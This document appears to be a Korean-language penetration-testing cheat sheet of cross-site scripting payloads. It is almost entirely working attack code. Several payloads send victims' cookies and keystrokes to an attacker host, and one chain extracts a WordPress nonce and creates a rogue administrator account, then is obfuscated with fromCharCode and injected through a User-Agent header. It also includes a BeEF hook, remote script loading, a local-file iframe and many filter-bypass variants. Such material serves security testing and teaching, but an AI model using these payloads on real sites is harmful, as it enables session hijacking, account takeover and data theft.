---
sidebar_position: 4
---

# Cross-Site Scripting (XSS)

## 기본 페이로드

```html
<!-- 기본 alert -->
<script>alert(1)</script>
<script>alert('XSS')</script>

<!-- 대소문자 우회 -->
<sCrIpt>alert(1)</ScRipt>

<!-- 쿠키 탈취 -->
<script>alert(document.cookie)</script>

<!-- DOM 조작 -->
<script>document.querySelector('#foobar-title').textContent = '<TEXT>'</script>

<!-- 쿠키 전송 -->
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>

<!-- 함수 실행 -->
<script>user.changeEmail('user@domain');</script>
```

## 이미지/iframe 태그

```html
<!-- iframe으로 파일 읽기 -->
<iframe src=file:///etc/passwd height=1000px width=1000px></iframe>

<!-- 이미지 로드 -->
<img src='http://<RHOST>'/>

<!-- onerror 이벤트 -->
<img src=x onerror=alert(1)>
<img src=x onerror="alert(document.cookie)">

<!-- onload 이벤트 -->
<body onload=alert(1)>
```

## XSS Client-Side Attack

### 공격 시나리오 (WordPress 예제)

#### 1. 악의적인 링크

```html
<a href="http://<RHOST>/send_btc?account=<USERNAME>&amount=100000">Click here!</a>
```

#### 2. Nonce 값 추출

```javascript
var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
var nonceRegex = /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];
```

#### 3. 관리자 생성 페이로드

```javascript
var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
```

#### 4. 압축된 페이로드

> https://jscompress.com/

```javascript
var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);
```

### 인코딩 함수

```javascript
function encode_to_javascript(string) {
    var input = string
    var output = '';
    for(pos = 0; pos < input.length; pos++) {
        output += input.charCodeAt(pos);
        if(pos != (input.length - 1)) {
            output += ",";
        }
    }
    return output;
}

let encoded = encode_to_javascript('var params="action=createuser&_wpnonce_create-user="+nonce+"&user_login=<USERNAME>&email=<EMAIL>&pass1=<PASSWORD>&pass2=<PASSWORD>&role=administrator";ajaxRequest=new XMLHttpRequest,ajaxRequest.open("POST",requestURL,!0),ajaxRequest.setRequestHeader("Content-Type","application/x-www-form-urlencoded"),ajaxRequest.send(params);')
console.log(encoded)
```

### 실행

```bash
curl -i http://<RHOST> --user-agent "<script>eval(String.fromCharCode(118,97,114,32,112,97,114,97,109,115,61,34,97,99,116,105,111,110,61,99,114,101,97,116,101,117,115,101,114,38,95,119,112,110,111,110,99,101,95,99,114,101,97,116,101,45,117,115,101,114,61,34,43,110,111,110,99,101,43,34,38,117,115,101,114,95,108,111,103,105,110,61,60,85,83,69,82,78,65,77,69,62,38,101,109,97,105,108,61,60,69,77,65,73,76,62,38,112,97,115,115,49,61,60,80,65,83,83,87,79,82,68,62,38,112,97,115,115,50,61,60,80,65,83,83,87,79,82,68,62,38,114,111,108,101,61,97,100,109,105,110,105,115,116,114,97,116,111,114,34,59,97,106,97,120,82,101,113,117,101,115,116,61,110,101,119,32,88,77,76,72,116,116,112,82,101,113,117,101,115,116,44,97,106,97,120,82,101,113,117,101,115,116,46,111,112,101,110,40,34,80,79,83,84,34,44,114,101,113,117,101,115,116,85,82,76,44,33,48,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,116,82,101,113,117,101,115,116,72,101,97,100,101,114,40,34,67,111,110,116,101,110,116,45,84,121,112,101,34,44,34,97,112,112,108,105,99,97,116,105,111,110,47,120,45,119,119,119,45,102,111,114,109,45,117,114,108,101,110,99,111,100,101,100,34,41,44,97,106,97,120,82,101,113,117,101,115,116,46,115,101,110,100,40,112,97,114,97,109,115,41,59))</script>" --proxy 127.0.0.1:8080
```

## 다양한 XSS 페이로드

### 기본 공격 벡터

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<script>alert(/XSS/)</script>
<script>alert`1`</script>
<script>(alert)(1)</script>
<script>eval('alert(1)')</script>
<script>eval('ale'+'rt(1)')</script>
```

### 이벤트 핸들러

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<iframe onload=alert(1)>
<video onerror=alert(1) src=x>
<audio onerror=alert(1) src=x>
```

### HTML 태그 우회

```html
<scr<script>ipt>alert(1)</scr</script>ipt>
<script>ale<!---->rt(1)</script>
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>
```

### JavaScript 실행

```html
<script src=http://<RHOST>/evil.js></script>
<script>fetch('http://<RHOST>/'+document.cookie)</script>
<script>new Image().src='http://<RHOST>/?c='+document.cookie</script>
<script>location='http://<RHOST>/?c='+document.cookie</script>
```

## 쿠키 탈취

```javascript
// Base64 인코딩
<script>fetch('https://<RHOST>/steal?cookie=' + btoa(document.cookie));</script>

// 직접 전송
<script>new Image().src='http://<RHOST>/log.php?c='+document.cookie;</script>

// XMLHttpRequest
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'http://<RHOST>/steal?cookie=' + document.cookie);
xhr.send();
</script>
```

## Keylogger

```javascript
<script>
document.onkeypress = function(e) {
    fetch('http://<RHOST>/log?key=' + String.fromCharCode(e.which));
}
</script>
```

## BeEF Hook

```html
<script src="http://<LHOST>:3000/hook.js"></script>
```

## 우회 기법

### 필터 우회

```html
<!-- 공백 우회 -->
<script>alert(1)</script>
<script>alert(1)</script>

<!-- 따옴표 우회 -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- 괄호 우회 -->
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>

<!-- script 태그 차단 우회 -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### 인코딩 우회

```html
<!-- HTML 엔티티 -->
&lt;script&gt;alert(1)&lt;/script&gt;

<!-- URL 인코딩 -->
%3Cscript%3Ealert(1)%3C/script%3E

<!-- Base64 -->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
```

## 참고

- Reflected XSS: URL 파라미터에서 반사
- Stored XSS: 데이터베이스에 저장
- DOM-based XSS: 클라이언트 측에서만 발생
- CSP 우회 필요 시 별도 기법 사용
- HttpOnly 쿠키는 JavaScript로 접근 불가
